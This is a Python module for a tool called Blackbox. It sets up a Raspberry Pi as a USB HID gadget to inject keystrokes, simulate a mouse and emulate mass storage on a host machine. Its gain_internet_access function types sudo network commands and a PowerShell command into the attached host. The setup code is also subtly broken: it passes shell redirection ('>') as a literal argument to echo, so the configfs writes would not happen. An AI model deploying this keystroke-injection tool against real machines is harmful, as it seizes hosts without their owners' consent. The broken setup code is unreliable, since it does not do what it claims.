#!/usr/bin/env python3
"""
modules/usb_hid.py

USB HID Audit Module for Blackbox.

Performs USB-based attacks using HID emulation:
- Keyboard injection (Rubber Ducky style).
- Mouse simulation.
- Mass storage emulation.
- Camera/webcam access (if supported).
- Optimized for Raspberry Pi Zero 2W with USB gadget support.
- Aims to gain internet access from host devices (Linux/Windows).
"""

from __future__ import annotations

import logging
import subprocess
import time
from pathlib import Path
from typing import Dict, Any

import yaml

logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).resolve().parent.parent
CONFIG_PATH = BASE_DIR / "config" / "config.yaml"


def _load_config() -> Dict[str, Any]:
    """Load config.yaml and merge with secrets.yaml if it exists."""
    if not CONFIG_PATH.is_file():
        return {}
    
    # Load main config
    data = yaml.safe_load(CONFIG_PATH.read_text(encoding="utf-8")) or {}
    
    # Merge secrets.yaml if it exists
    secrets_path = CONFIG_PATH.parent / "secrets.yaml"
    if secrets_path.is_file():
        secrets = yaml.safe_load(secrets_path.read_text(encoding="utf-8")) or {}
        # Deep merge secrets into config
        def deep_merge(base, update):
            for key, value in update.items():
                if isinstance(value, dict) and key in base and isinstance(base[key], dict):
                    deep_merge(base[key], value)
                else:
                    base[key] = value
        deep_merge(data, secrets)
    
    return data


def _run_command(cmd: list[str], timeout: int = 30) -> str:
    """Run a command and return output."""
    try:
        result = subprocess.run(cmd, timeout=timeout, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        logger.error("Command failed: %s, stderr: %s", cmd, e.stderr)
        return ""
    except subprocess.TimeoutExpired:
        logger.error("Command timed out: %s", cmd)
        return ""


def setup_usb_gadget() -> bool:
    """Setup USB gadget for HID emulation."""
    logger.info("Setting up USB gadget for HID.")
    # Commands to setup USB gadget (requires kernel modules and configfs)
    cmds = [
        ["modprobe", "libcomposite"],
        ["mkdir", "-p", "/sys/kernel/config/usb_gadget/g1"],
        ["echo", "0x1d6b", ">", "/sys/kernel/config/usb_gadget/g1/idVendor"],  # Linux Foundation
        ["echo", "0x0104", ">", "/sys/kernel/config/usb_gadget/g1/idProduct"],  # Multifunction Composite Gadget
        ["mkdir", "-p", "/sys/kernel/config/usb_gadget/g1/strings/0x409"],
        ["echo", "Blackbox", ">", "/sys/kernel/config/usb_gadget/g1/strings/0x409/manufacturer"],
        ["echo", "HID Gadget", ">", "/sys/kernel/config/usb_gadget/g1/strings/0x409/product"],
        ["mkdir", "-p", "/sys/kernel/config/usb_gadget/g1/configs/c.1/strings/0x409"],
        ["echo", "Config 1", ">", "/sys/kernel/config/usb_gadget/g1/configs/c.1/strings/0x409/configuration"],
        # Add HID functions
        ["mkdir", "-p", "/sys/kernel/config/usb_gadget/g1/functions/hid.usb0"],
        ["echo", "1", ">", "/sys/kernel/config/usb_gadget/g1/functions/hid.usb0/protocol"],
        ["echo", "1", ">", "/sys/kernel/config/usb_gadget/g1/functions/hid.usb0/subclass"],
        ["echo", "8", ">", "/sys/kernel/config/usb_gadget/g1/functions/hid.usb0/report_length"],
        ["echo", "-ne", "\\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0", ">", "/sys/kernel/config/usb_gadget/g1/functions/hid.usb0/report_desc"],
        ["ln", "-s", "/sys/kernel/config/usb_gadget/g1/functions/hid.usb0", "/sys/kernel/config/usb_gadget/g1/configs/c.1/"],
        ["echo", "ci_hdrc.0", ">", "/sys/kernel/config/usb_gadget/g1/UDC"],  # Bind to UDC
    ]
    for cmd in cmds:
        if not _run_command(cmd):
            logger.error("Failed to setup USB gadget with command: %s", cmd)
            return False
    logger.info("USB gadget setup complete.")
    return True


def inject_keystrokes(payload: str) -> None:
    """Inject keystrokes via HID."""
    logger.info("Injecting keystrokes: %s", payload)
    # For simplicity, use a tool like hid-gadget-test or custom script
    # Assuming hid-gadget-test is available
    cmd = ["hid-gadget-test", "/dev/hidg0", "keyboard"]
    # Send payload as input
    try:
        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, text=True)
        proc.communicate(input=payload, timeout=10)
    except Exception as e:
        logger.error("Error injecting keystrokes: %s", e)


def simulate_mouse() -> None:
    """Simulate mouse movements."""
    logger.info("Simulating mouse movements.")
    # Example: move mouse
    cmd = ["hid-gadget-test", "/dev/hidg0", "mouse"]
    # Send mouse data
    try:
        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)
        # Example data for mouse move
        proc.communicate(b"\x00\x05\x05", timeout=5)  # Relative move
    except Exception as e:
        logger.error("Error simulating mouse: %s", e)


def emulate_mass_storage() -> None:
    """Emulate mass storage device."""
    logger.info("Emulating mass storage.")
    # Setup mass storage function
    cmds = [
        ["mkdir", "-p", "/sys/kernel/config/usb_gadget/g1/functions/mass_storage.usb0"],
        ["echo", "1", ">", "/sys/kernel/config/usb_gadget/g1/functions/mass_storage.usb0/stall"],
        ["echo", "0", ">", "/sys/kernel/config/usb_gadget/g1/functions/mass_storage.usb0/lun.0/cdrom"],
        ["echo", "0", ">", "/sys/kernel/config/usb_gadget/g1/functions/mass_storage.usb0/lun.0/ro"],
        ["echo", "0", ">", "/sys/kernel/config/usb_gadget/g1/functions/mass_storage.usb0/lun.0/nofua"],
        ["echo", "/path/to/image.img", ">", "/sys/kernel/config/usb_gadget/g1/functions/mass_storage.usb0/lun.0/file"],  # Need actual image
        ["ln", "-s", "/sys/kernel/config/usb_gadget/g1/functions/mass_storage.usb0", "/sys/kernel/config/usb_gadget/g1/configs/c.1/"],
    ]
    for cmd in cmds:
        _run_command(cmd)


def gain_internet_access() -> None:
    """Attempt to gain internet access from host."""
    logger.info("Attempting to gain internet access via USB.")
    # Payloads for Linux/Windows to enable USB tethering
    linux_payload = "sudo nmcli device set usb0 managed yes\nsudo dhclient usb0\n"  # Example
    windows_payload = "powershell -Command \"Set-NetIPInterface -InterfaceAlias 'USB Ethernet' -Dhcp Enabled\"\n"  # Example

    # Detect OS? For simplicity, try both or based on params
    inject_keystrokes(linux_payload)
    time.sleep(2)
    inject_keystrokes(windows_payload)


def run(job) -> None:
    """Run USB HID audit."""
    profile = job.profile or "default"
    logger.info("Starting USB HID audit for job %s with profile %s", job.id, profile)

    try:
        if not setup_usb_gadget():
            logger.error("Failed to setup USB gadget for job %s", job.id)
            return

        # Perform HID attacks
        gain_internet_access()
        simulate_mouse()
        emulate_mass_storage()

        logger.info("USB HID audit completed for job %s", job.id)
    except Exception as e:
        logger.error("Error in USB HID audit for job %s: %s", job.id, e)